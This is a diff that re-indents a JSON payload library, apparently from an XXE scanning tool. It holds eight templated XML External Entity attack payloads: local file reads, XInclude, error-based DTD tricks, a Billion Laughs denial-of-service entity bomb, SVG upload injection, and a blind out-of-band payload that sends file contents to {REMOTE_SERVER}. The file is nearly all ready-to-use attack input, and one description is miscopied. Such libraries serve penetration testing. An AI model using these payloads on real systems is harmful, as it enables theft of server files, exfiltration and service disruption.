@@ -1,118 +1,118 @@
 [
-  {
-    "id": "1",
-    "name": "XXE Local File Inclusion",
-    "description": "XXE Local File Inclusion, it require an XML parameters to be reflected in the response",
-    "document_type": ["plain_XML"],
-    "oracle": "INBAND",
-    "primitive": ["READ"],
-    "payload": [
-      {
-        "main": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM '{RESSOURCE}'>]><root>&test;</root>",
-        "description": "XXE Local File Inclusion, it require an XML parameters to be reflected in the response"
-      }
-    ]
-  },
-  {
-    "id": "2",
-    "name": "XXE X-include Local File Inclusion",
-    "description": "Local File Inclusion alternative using X-include in case you can't define DOCTYPE section",
-    "document_type": ["plain_XML"],
-    "oracle": "INBAND",
-    "primitive": ["READ"],
-    "payload": [
-      {
-        "main": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"{RESSOURCE}\"/></foo>",
-        "description": "Local File Inclusion alternative using X-include in case you can't define DOCTYPE section"
-      }
-    ]
-  },
-  {
-    "id": "3",
-    "name": "XXE replace detection",
-    "description": "using replace to detect XML parsing operation for XXE exploitation",
-    "document_type": ["plain_XML"],
-    "oracle": "INBAND",
-    "primitive": ["DETECTION"],
-    "payload": [
-      {
-        "main": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]> <userInfo>  <firstName>John</firstName>  <lastName>&example;</lastName> </userInfo>",
-        "description": "using replace to detect XML parsing operation for XXE exploitation"
-      }
-    ]
-  },
-  {
-    "id": "4",
-    "name": "XXE Billion Laughs",
-    "description": "using replace to detect XML parsing operation for XXE exploitation",
-    "document_type": ["plain_XML"],
-    "oracle": "INBAND",
-    "primitive": ["DOS"],
-    "payload": [
-      {
-        "main": "<!DOCTYPE data [<!ENTITY a0 \"dos\" ><!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"><!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"><!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"><!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">]><data>&a4;</data>",
-        "description": "using replace to detect XML parsing operation for XXE exploitation"
-      }
-    ]
-  },
-  {
-    "id": "5",
-    "name": "XXE Error Based - Local DTD File",
-    "description": "XXE attack local DTD file to extract sensitive data",
-    "document_type": ["plain_XML"],
-    "oracle": "OOB",
-    "primitive": ["READ"],
-    "payload": [
-      {
-        "main": "<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"><!ENTITY % constant 'aaa)><!ENTITY &#x25; file SYSTEM \"{RESSOURCE}\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">&#x25;eval;&#x25;error;<!ELEMENT aa (bb'>%local_dtd;]><message>Text</message>",
-        "description": "XXE attack local DTD file to extract sensitive data"
-      }
-    ]
-  },
-  {
-    "id": "6",
-    "name": "XXE Error Based - Using Remote DTD",
-    "description": "XXE attack using remote DTD file to extract sensitive data",
-    "document_type": ["plain_XML"],
-    "oracle": "OOB",
-    "primitive": ["READ"],
-    "payload": [
-      {
-        "main": "<?xml version=\"1.0\" ?><!DOCTYPE message [<!ENTITY % ext SYSTEM \"{DTD_PATH}\">%ext;]><message></message>",
-        "description": "XXE attack using remote DTD file to extract sensitive data"
-      },
-      {
-        "main": "<!ENTITY % file SYSTEM \"{RESSOURCE}\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;",
-        "description": "Remote DTD"
-      }
-    ]
-  },
-  {
-    "id": "7",
-    "name": "Basic Blind XXE exfiltration",
-    "description": "Blind XXE attacks to load a remote resource and send the content of a local file to a remote server",
-    "document_type": ["plain_XML"],
-    "oracle": "OOB",
-    "primitive": ["READ"],
-    "payload": [
-      {
-        "main": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"{RESSOURCE}\" ><!ENTITY callhome SYSTEM \"{REMOTE_SERVER}/?%xxe;\\;\">]><foo>&callhome;</foo>",
-        "description": "Out of band XXE exploitation that send the content of {RESSOURCE} to {REMOTE_SERVER}"
-      }
-    ]
-  },
-  {
-    "id": "8",
-    "name": "XXE Inband - SVG File",
-    "description": "Inband XXE attack using SVG file to extract sensitive data",
-    "document_type": ["SVG"],
-    "oracle": "INBAND",
-    "primitive": ["READ"],
-    "payload": [
-      {
-        "main": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"{RESSOURCE}\" >]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
-        "description": "You can use this payload to test XXE vulnerability in SVG file (e.g Profile picture upload), SVG parsing lib etc..."
-      }
-    ]
-  }
+	{
+		"id": "1",
+		"name": "XXE Local File Inclusion",
+		"description": "XXE Local File Inclusion, it require an XML parameters to be reflected in the response",
+		"document_type": ["plain_XML"],
+		"oracle": "INBAND",
+		"primitive": ["READ"],
+		"payload": [
+			{
+				"main": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM '{RESSOURCE}'>]><root>&test;</root>",
+				"description": "XXE Local File Inclusion, it require an XML parameters to be reflected in the response"
+			}
+		]
+	},
+	{
+		"id": "2",
+		"name": "XXE X-include Local File Inclusion",
+		"description": "Local File Inclusion alternative using X-include in case you can't define DOCTYPE section",
+		"document_type": ["plain_XML"],
+		"oracle": "INBAND",
+		"primitive": ["READ"],
+		"payload": [
+			{
+				"main": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"{RESSOURCE}\"/></foo>",
+				"description": "Local File Inclusion alternative using X-include in case you can't define DOCTYPE section"
+			}
+		]
+	},
+	{
+		"id": "3",
+		"name": "XXE replace detection",
+		"description": "using replace to detect XML parsing operation for XXE exploitation",
+		"document_type": ["plain_XML"],
+		"oracle": "INBAND",
+		"primitive": ["DETECTION"],
+		"payload": [
+			{
+				"main": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]> <userInfo>  <firstName>John</firstName>  <lastName>&example;</lastName> </userInfo>",
+				"description": "using replace to detect XML parsing operation for XXE exploitation"
+			}
+		]
+	},
+	{
+		"id": "4",
+		"name": "XXE Billion Laughs",
+		"description": "using replace to detect XML parsing operation for XXE exploitation",
+		"document_type": ["plain_XML"],
+		"oracle": "INBAND",
+		"primitive": ["DOS"],
+		"payload": [
+			{
+				"main": "<!DOCTYPE data [<!ENTITY a0 \"dos\" ><!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\"><!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\"><!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\"><!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">]><data>&a4;</data>",
+				"description": "using replace to detect XML parsing operation for XXE exploitation"
+			}
+		]
+	},
+	{
+		"id": "5",
+		"name": "XXE Error Based - Local DTD File",
+		"description": "XXE attack local DTD file to extract sensitive data",
+		"document_type": ["plain_XML"],
+		"oracle": "OOB",
+		"primitive": ["READ"],
+		"payload": [
+			{
+				"main": "<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\"><!ENTITY % constant 'aaa)><!ENTITY &#x25; file SYSTEM \"{RESSOURCE}\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">&#x25;eval;&#x25;error;<!ELEMENT aa (bb'>%local_dtd;]><message>Text</message>",
+				"description": "XXE attack local DTD file to extract sensitive data"
+			}
+		]
+	},
+	{
+		"id": "6",
+		"name": "XXE Error Based - Using Remote DTD",
+		"description": "XXE attack using remote DTD file to extract sensitive data",
+		"document_type": ["plain_XML"],
+		"oracle": "OOB",
+		"primitive": ["READ"],
+		"payload": [
+			{
+				"main": "<?xml version=\"1.0\" ?><!DOCTYPE message [<!ENTITY % ext SYSTEM \"{DTD_PATH}\">%ext;]><message></message>",
+				"description": "XXE attack using remote DTD file to extract sensitive data"
+			},
+			{
+				"main": "<!ENTITY % file SYSTEM \"{RESSOURCE}\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;",
+				"description": "Remote DTD"
+			}
+		]
+	},
+	{
+		"id": "7",
+		"name": "Basic Blind XXE exfiltration",
+		"description": "Blind XXE attacks to load a remote resource and send the content of a local file to a remote server",
+		"document_type": ["plain_XML"],
+		"oracle": "OOB",
+		"primitive": ["READ"],
+		"payload": [
+			{
+				"main": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"{RESSOURCE}\" ><!ENTITY callhome SYSTEM \"{REMOTE_SERVER}/?%xxe;\\;\">]><foo>&callhome;</foo>",
+				"description": "Out of band XXE exploitation that send the content of {RESSOURCE} to {REMOTE_SERVER}"
+			}
+		]
+	},
+	{
+		"id": "8",
+		"name": "XXE Inband - SVG File",
+		"description": "Inband XXE attack using SVG file to extract sensitive data",
+		"document_type": ["SVG"],
+		"oracle": "INBAND",
+		"primitive": ["READ"],
+		"payload": [
+			{
+				"main": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"{RESSOURCE}\" >]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg>",
+				"description": "You can use this payload to test XXE vulnerability in SVG file (e.g Profile picture upload), SVG parsing lib etc..."
+			}
+		]
+	}
 ]
